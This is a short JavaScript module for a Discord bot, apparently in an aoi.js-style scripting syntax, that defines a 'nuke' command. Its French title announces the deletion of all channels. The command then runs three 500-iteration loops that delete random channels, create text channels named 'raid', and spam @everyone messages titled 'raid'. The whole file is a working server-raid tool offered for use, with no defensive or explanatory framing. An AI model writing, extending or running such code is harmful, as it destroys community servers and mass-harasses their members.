module.exports = [{
  name: "nuke",
  code: `$title[Suppression De Tous les Salons...]
  $description[Veuillez patienter...]
  $addTimestamp
  $loop[500;nukeeee]
  $loop[500;nukeee]
  
  $loop[500;nukee]`
}, {
  type: 'awaitedCommand',
  name: "nukee",
  code: `$deleteChannels[$randomChannelID]`
}, {
  type: 'awaitedCommand',
  name: "nukeee",
  code: `$createChannel[raid;text]`
}, {
  type: 'awaitedCommand',
  name: "nukeeee",
  code: `$channelSendMessage[$randomChannelID;@everyone {title:raid}]`
}]